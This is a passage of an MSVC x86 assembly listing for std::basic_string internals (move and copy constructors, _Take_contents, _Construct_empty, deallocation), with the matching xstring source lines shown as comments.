  00019	e8 00 00 00 00	 call	 ??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > >
  0001e	83 c4 04	 add	 esp, 4
  00021	89 45 e8	 mov	 DWORD PTR __My_data_mem$1[ebp], eax

; 3077 :                     reinterpret_cast<unsigned char*>(_STD addressof(_Mypair._Myval2)) + _Memcpy_val_offset;
; 3078 :                 const auto _Right_data_mem =

  00024	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00027	50		 push	 eax
  00028	e8 00 00 00 00	 call	 ??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > >
  0002d	83 c4 04	 add	 esp, 4
  00030	89 45 ec	 mov	 DWORD PTR __Right_data_mem$2[ebp], eax

; 3079 :                     reinterpret_cast<const unsigned char*>(_STD addressof(_Right._Mypair._Myval2)) + _Memcpy_val_offset;
; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00033	6a 18		 push	 24			; 00000018H
  00035	8b 4d ec	 mov	 ecx, DWORD PTR __Right_data_mem$2[ebp]
  00038	51		 push	 ecx
  00039	8b 55 e8	 mov	 edx, DWORD PTR __My_data_mem$1[ebp]
  0003c	52		 push	 edx
  0003d	e8 00 00 00 00	 call	 _memcpy
  00042	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3081 : 
; 3082 :                 _Right_data._Mysize = 0;

  00045	8b 45 f8	 mov	 eax, DWORD PTR __Right_data$[ebp]
  00048	c7 40 10 00 00
	00 00		 mov	 DWORD PTR [eax+16], 0

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  0004f	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  00052	c7 41 14 0f 00
	00 00		 mov	 DWORD PTR [ecx+20], 15	; 0000000fH

; 3084 :                 _Right_data._Activate_SSO_buffer();

  00059	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  0005c	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Activate_SSO_buffer

; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  00061	c6 45 ff 00	 mov	 BYTE PTR $T4[ebp], 0
  00065	8d 55 ff	 lea	 edx, DWORD PTR $T4[ebp]
  00068	52		 push	 edx
  00069	b8 01 00 00 00	 mov	 eax, 1
  0006e	6b c8 00	 imul	 ecx, eax, 0
  00071	03 4d f8	 add	 ecx, DWORD PTR __Right_data$[ebp]
  00074	51		 push	 ecx
  00075	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0007a	83 c4 08	 add	 esp, 8

; 3086 :                 return;

  0007d	e9 a7 00 00 00	 jmp	 $LN1@Take_conte

; 3087 :             }
; 3088 :         }
; 3089 : #endif // !defined(_INSERT_STRING_ANNOTATION)
; 3090 : 
; 3091 :         if (_Right_data._Large_mode_engaged()) { // steal buffer

  00082	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  00085	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged
  0008a	0f b6 d0	 movzx	 edx, al
  0008d	85 d2		 test	 edx, edx
  0008f	74 26		 je	 SHORT $LN2@Take_conte

; 3092 :             _Swap_proxy_and_iterators(_Right);

  00091	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00094	50		 push	 eax
  00095	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00098	e8 00 00 00 00	 call	 ?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators

; 3093 : 
; 3094 :             _Construct_in_place(_My_data._Bx._Ptr, _Right_data._Bx._Ptr);

  0009d	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  000a0	51		 push	 ecx
  000a1	8b 55 f4	 mov	 edx, DWORD PTR __My_data$[ebp]
  000a4	52		 push	 edx
  000a5	e8 00 00 00 00	 call	 ??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z ; std::_Construct_in_place<char *,char * &>
  000aa	83 c4 08	 add	 esp, 8

; 3095 :             _Right_data._Bx._Switch_to_buf();

  000ad	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  000b0	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Switch_to_buf

; 3096 :         } else { // copy small string buffer

  000b5	eb 2a		 jmp	 SHORT $LN3@Take_conte
$LN2@Take_conte:

; 3097 :             _Right_data._Orphan_all();

  000b7	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  000ba	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 3098 : 
; 3099 :             _My_data._Activate_SSO_buffer();

  000bf	8b 4d f4	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000c2	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Activate_SSO_buffer

; 3100 :             _Traits::copy(_My_data._Bx._Buf, _Right_data._Bx._Buf, _Right_data._Mysize + 1);

  000c7	8b 45 f8	 mov	 eax, DWORD PTR __Right_data$[ebp]
  000ca	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  000cd	83 c1 01	 add	 ecx, 1
  000d0	51		 push	 ecx
  000d1	8b 55 f8	 mov	 edx, DWORD PTR __Right_data$[ebp]
  000d4	52		 push	 edx
  000d5	8b 45 f4	 mov	 eax, DWORD PTR __My_data$[ebp]
  000d8	50		 push	 eax
  000d9	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  000de	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN3@Take_conte:

; 3101 :         }
; 3102 : 
; 3103 :         _My_data._Myres  = _Right_data._Myres;

  000e1	8b 4d f4	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000e4	8b 55 f8	 mov	 edx, DWORD PTR __Right_data$[ebp]
  000e7	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  000ea	89 41 14	 mov	 DWORD PTR [ecx+20], eax

; 3104 :         _My_data._Mysize = _Right_data._Mysize;

  000ed	8b 4d f4	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000f0	8b 55 f8	 mov	 edx, DWORD PTR __Right_data$[ebp]
  000f3	8b 42 10	 mov	 eax, DWORD PTR [edx+16]
  000f6	89 41 10	 mov	 DWORD PTR [ecx+16], eax

; 3105 : 
; 3106 :         _Right_data._Mysize = 0;

  000f9	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  000fc	c7 41 10 00 00
	00 00		 mov	 DWORD PTR [ecx+16], 0

; 3107 :         _Right_data._Myres  = _Small_string_capacity;

  00103	8b 55 f8	 mov	 edx, DWORD PTR __Right_data$[ebp]
  00106	c7 42 14 0f 00
	00 00		 mov	 DWORD PTR [edx+20], 15	; 0000000fH

; 3108 :         _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  0010d	c6 45 fe 00	 mov	 BYTE PTR $T3[ebp], 0
  00111	8d 45 fe	 lea	 eax, DWORD PTR $T3[ebp]
  00114	50		 push	 eax
  00115	b9 01 00 00 00	 mov	 ecx, 1
  0011a	6b d1 00	 imul	 edx, ecx, 0
  0011d	03 55 f8	 add	 edx, DWORD PTR __Right_data$[ebp]
  00120	52		 push	 edx
  00121	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  00126	83 c4 08	 add	 esp, 8
$LN1@Take_conte:

; 3109 :     }

  00129	8b e5		 mov	 esp, ebp
  0012b	5d		 pop	 ebp
  0012c	c2 04 00	 ret	 4
?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z
_TEXT	SEGMENT
tv89 = -20						; size = 4
tv77 = -16						; size = 4
tv75 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -2						; size = 1
$T2 = -1						; size = 1
__Right$ = 8						; size = 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT
; _this$ = ecx

; 2816 :         : _Mypair(_One_then_variadic_args_t{}, _STD move(_Right._Getal())) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f0	 mov	 DWORD PTR tv77[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00017	50		 push	 eax
  00018	e8 00 00 00 00	 call	 ??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ; std::move<std::allocator<char> &>
  0001d	83 c4 04	 add	 esp, 4
  00020	89 45 f4	 mov	 DWORD PTR tv75[ebp], eax
  00023	8a 4d fe	 mov	 cl, BYTE PTR $T1[ebp]
  00026	88 4d ff	 mov	 BYTE PTR $T2[ebp], cl
  00029	8b 55 f4	 mov	 edx, DWORD PTR tv75[ebp]
  0002c	52		 push	 edx
  0002d	0f b6 45 ff	 movzx	 eax, BYTE PTR $T2[ebp]
  00031	50		 push	 eax
  00032	8b 4d f0	 mov	 ecx, DWORD PTR tv77[ebp]
  00035	e8 00 00 00 00	 call	 ??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >

; 2817 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  0003a	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0003d	89 4d ec	 mov	 DWORD PTR tv89[ebp], ecx
  00040	68 00 00 00 00	 push	 OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc
  00045	8b 4d ec	 mov	 ecx, DWORD PTR tv89[ebp]
  00048	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2818 :         _Take_contents(_Right);

  0004d	8b 55 08	 mov	 edx, DWORD PTR __Right$[ebp]
  00050	52		 push	 edx
  00051	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00054	e8 00 00 00 00	 call	 ?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents

; 2819 :     }

  00059	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0005c	8b e5		 mov	 esp, ebp
  0005e	5d		 pop	 ebp
  0005f	c2 04 00	 ret	 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ
_TEXT	SEGMENT
_this$ = -12						; size = 4
__My_data$ = -8						; size = 4
$T1 = -1						; size = 1
?_Construct_empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct_empty, COMDAT
; _this$ = ecx

; 2643 :     _CONSTEXPR20 void _Construct_empty() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 2644 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __My_data$[ebp], eax

; 2645 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  0000f	68 00 00 00 00	 push	 OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc
  00014	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00017	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2646 : 
; 2647 :         // initialize basic_string data members
; 2648 :         _My_data._Mysize = 0;

  0001c	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0001f	c7 41 10 00 00
	00 00		 mov	 DWORD PTR [ecx+16], 0

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00026	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00029	c7 42 14 0f 00
	00 00		 mov	 DWORD PTR [edx+20], 15	; 0000000fH

; 2650 :         _My_data._Activate_SSO_buffer();

  00030	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00033	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Activate_SSO_buffer

; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00038	c6 45 ff 00	 mov	 BYTE PTR $T1[ebp], 0
  0003c	8d 45 ff	 lea	 eax, DWORD PTR $T1[ebp]
  0003f	50		 push	 eax
  00040	b9 01 00 00 00	 mov	 ecx, 1
  00045	6b d1 00	 imul	 edx, ecx, 0
  00048	03 55 f8	 add	 edx, DWORD PTR __My_data$[ebp]
  0004b	52		 push	 edx
  0004c	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  00051	83 c4 08	 add	 esp, 8

; 2654 :     }

  00054	8b e5		 mov	 esp, ebp
  00056	5d		 pop	 ebp
  00057	c3		 ret	 0
?_Construct_empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z
_TEXT	SEGMENT
__Al$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Capacity$ = 16					; size = 4
?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity, COMDAT

; 2638 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 2639 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2640 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

  00003	8b 45 10	 mov	 eax, DWORD PTR __Capacity$[ebp]
  00006	83 c0 01	 add	 eax, 1
  00009	50		 push	 eax
  0000a	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  0000d	51		 push	 ecx
  0000e	8b 4d 08	 mov	 ecx, DWORD PTR __Al$[ebp]
  00011	e8 00 00 00 00	 call	 ?deallocate@?$allocator@D@std@@QAEXQADI@Z ; std::allocator<char>::deallocate

; 2641 :     }

  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z
_TEXT	SEGMENT
tv69 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Ptr$ = 8						; size = 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT
; _this$ = ecx

; 2556 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv69[ebp], eax
  0000f	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T1[ebp]
  00013	51		 push	 ecx
  00014	8b 4d f4	 mov	 ecx, DWORD PTR tv69[ebp]
  00017	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>

; 2557 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

  0001c	8b 55 08	 mov	 edx, DWORD PTR __Ptr$[ebp]
  0001f	52		 push	 edx
  00020	e8 00 00 00 00	 call	 ?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z ; std::_Narrow_char_traits<char,int>::length
  00025	83 c4 04	 add	 esp, 4
  00028	50		 push	 eax
  00029	e8 00 00 00 00	 call	 ??$_Convert_size@II@std@@YAII@Z ; std::_Convert_size<unsigned int,unsigned int>
  0002e	83 c4 04	 add	 esp, 4
  00031	50		 push	 eax
  00032	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  00035	50		 push	 eax
  00036	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00039	e8 00 00 00 00	 call	 ??$_Construct@$00PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>

; 2558 :     }

  0003e	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00041	8b e5		 mov	 esp, ebp
  00043	5d		 pop	 ebp
  00044	c2 04 00	 ret	 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z
_TEXT	SEGMENT
tv69 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT
; _this$ = ecx

; 2546 :         : _Mypair(_Zero_then_variadic_args_t{}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv69[ebp], eax
  0000f	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T1[ebp]
  00013	51		 push	 ecx
  00014	8b 4d f4	 mov	 ecx, DWORD PTR tv69[ebp]
  00017	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>

; 2547 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Count);

  0001c	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  0001f	52		 push	 edx
  00020	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  00023	50		 push	 eax
  00024	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00027	e8 00 00 00 00	 call	 ??$_Construct@$00PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>

; 2548 :     }

  0002c	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c2 08 00	 ret	 8
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
tv92 = -24						; size = 4
tv94 = -20						; size = 4
tv78 = -16						; size = 4
tv76 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -3						; size = 1
$T2 = -2						; size = 1
$T3 = -1						; size = 1
__Right$ = 8						; size = 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT
; _this$ = ecx

; 2508 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f0	 mov	 DWORD PTR tv78[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEABV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00017	50		 push	 eax
  00018	8d 4d fe	 lea	 ecx, DWORD PTR $T2[ebp]
  0001b	51		 push	 ecx
  0001c	e8 00 00 00 00	 call	 ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@ABV32@@Z ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction
  00021	83 c4 08	 add	 esp, 8
  00024	89 45 f4	 mov	 DWORD PTR tv76[ebp], eax
  00027	8a 55 fd	 mov	 dl, BYTE PTR $T1[ebp]
  0002a	88 55 ff	 mov	 BYTE PTR $T3[ebp], dl
  0002d	8b 45 f4	 mov	 eax, DWORD PTR tv76[ebp]
  00030	50		 push	 eax
  00031	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T3[ebp]
  00035	51		 push	 ecx
  00036	8b 4d f0	 mov	 ecx, DWORD PTR tv78[ebp]
  00039	e8 00 00 00 00	 call	 ??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  0003e	8b 55 08	 mov	 edx, DWORD PTR __Right$[ebp]
  00041	8b 42 10	 mov	 eax, DWORD PTR [edx+16]
  00044	89 45 ec	 mov	 DWORD PTR tv94[ebp], eax
  00047	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  0004a	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
  0004f	89 45 e8	 mov	 DWORD PTR tv92[ebp], eax
  00052	8b 4d ec	 mov	 ecx, DWORD PTR tv94[ebp]
  00055	51		 push	 ecx
  00056	8b 55 e8	 mov	 edx, DWORD PTR tv92[ebp]
  00059	52		 push	 edx
  0005a	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0005d	e8 00 00 00 00	 call	 ??$_Construct@$01PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>

; 2510 :     }

  00062	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00065	8b e5		 mov	 esp, ebp
  00067	5d		 pop	 ebp
  00068	c2 04 00	 ret	 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV?$allocator@D@1@@Z
_TEXT	SEGMENT
tv70 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Al$ = 8						; size = 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV?$allocator@D@1@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT
; _this$ = ecx

; 2503 :     _CONSTEXPR20 explicit basic_string(const _Alloc& _Al) noexcept : _Mypair(_One_then_variadic_args_t{}, _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv70[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Al$[ebp]
